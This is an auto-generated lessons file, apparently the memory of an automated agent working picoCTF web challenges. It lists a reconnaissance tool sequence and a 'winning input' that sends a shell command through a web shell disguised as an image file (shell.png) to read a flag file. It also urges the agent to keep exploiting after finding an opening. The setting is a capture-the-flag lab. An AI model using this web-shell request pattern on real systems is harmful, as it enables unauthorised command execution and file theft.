# Consolidated Lessons: Reconnaissance & Hidden Paths

> **Auto-generated:** 2026-04-17 07:34:59 UTC
> **Category:** Reconnaissance & Hidden Paths
> **Type:** consolidated_lessons (4 docs — 2 success, 2 failure)
> **Tags:** `consolidated, reconnaissance_&_hidden_paths, lessons, high-priority, wisdom`

> **Agent Note:** This consolidates patterns from multiple runs on this category.
> Use the Quick Exploitation Path as your primary action guide.

---

## Coverage

- **Total atomic rule docs:** 4
- **Success runs:** 2
- **Failure/partial runs:** 2

## Best Exploitation Path (from most recent success)

> **Note:** Replace `<TARGET_URL>` with the current challenge URL.

1. **`http_fetch`**: Fetch the target URL to map the application and identify input forms — use: `{"url":"<TARGET_URL>/images/shell.png","method":"GET","params":{"c":"cat /var/www/flag.txt 2>&1"},"max_body":4000}`
2. **`javascript_source`**: Inspect JS for injection points, credentials, or API endpoints
3. **`robots_txt`**: Check robots.txt for hidden paths
4. **`path_enumerator`**: Enumerate hidden paths and directories
5. **`form_submit`**: Submit a payload via the identified form or API endpoint

## Key Takeaways (ranked by frequency across runs)

1. Follow this winning tool sequence: http_fetch → javascript_source → robots_txt → path_enumerator → form_submit
2. Continue exploitation after confirming 'ssti_confirmed' — do not stop at reconnaissance
3. Service may be rate-limiting or the challenge URL has changed — reduce request rate, verify URL, and try http_fetch before specialised tools
4. Immediately call cookie_set, form_submit, http_fetch before exploring other vectors — do not miss this signal

## Confirmed Winning Inputs

These exact requests produced the flag:

- `http_fetch` input: {"url":"http://amiable-citadel.picoctf.net:56459/images/shell.png","method":"GET","params":{"c":"cat /var/www/flag.txt 2>&1"},"max_body":4000}
